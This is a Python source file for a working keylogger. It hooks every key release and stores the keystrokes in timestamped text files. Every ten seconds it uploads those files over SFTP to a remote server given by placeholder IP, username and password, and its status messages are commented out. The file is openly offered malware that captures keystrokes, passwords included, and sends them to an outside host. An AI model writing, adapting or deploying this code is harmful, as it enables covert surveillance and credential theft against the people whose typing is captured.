## Import necessary modules
from time import sleep
import keyboard # for keylogs
import smtplib # send emails with SMTP protocol
from threading import Timer
from datetime import datetime
import paramiko

## Initialize parameters
SEND_REPORT_EVERY = 10

## Build class for keylogger
class Keylogger:
    def __init__(self, interval, report_method = "file"):
        # Pass SEND_REPORT_EVERY to interval later
        self.interval = interval
        self.report_method = report_method

        # Create string variable to hold log of all keystrokes in "self.interval"
        self.log = ""

        # Record start and end
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    ## Callback for every key release
    def callback(self, event):
        """
        This callback is invoked when a keyboard event occurs
        """

        name = event.name
        if len(name) > 1:
            # Special keys only
            # Uppercase with []
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # Replace name with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # Finally, add key name to global "self.log"
        self.log += name

    ## Report keylogs to local file
    def update_filename(self):
        # Construct file name to be identified by start and end times
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """
        Creates log file in current directory containing keylogs in 'self.log' variable
        """
        # Open file in write mode
        with open(f"{self.filename}.txt", "w") as f:
            # Write keylogs to file
            print(self.log, file = f)
            
        # print(f"[+] Saved {self.filename}.txt")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect('SERVER IP', username='USERNAME', password='PASSWORD')

        # print ("connected successfully!")

        sftp = ssh.open_sftp()
        sftp.put(self.filename+".txt", "PATH TO YOUR SERVER FOLDER"+"/"+self.filename+".txt")
        sftp.close()
        ssh.close()

    def report(self):
        """
        Call this function every 'self.interval' to send keylogs and reset 'self.log'
        """
        if self.log:
            # If something in log, report it
            self.end_dt = datetime.now()

            # Update file name
            self.update_filename()
            
            if self.report_method == "file":
                self.report_to_file()
            self.start_dt = datetime.now()

        self.log = ""
        timer = Timer(interval = self.interval, function = self.report)
        
        # Set thread as daemon (dies when main thread dies)
        timer.daemon = True

        # Start timer
        timer.start()
        
    def start(self):
        # Record start time
        self.start_dt = datetime.now()

        # Start keylogger
        keyboard.on_release(callback = self.callback)

        # Start reporting keylogs
        self.report()

        # Make simple message
        # print(f"{datetime.now()} - Started keylogger")

        # Block current thread, wait until CTRL+C
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval = SEND_REPORT_EVERY, report_method = "file")
    keylogger.start()


    # exit()
    
        
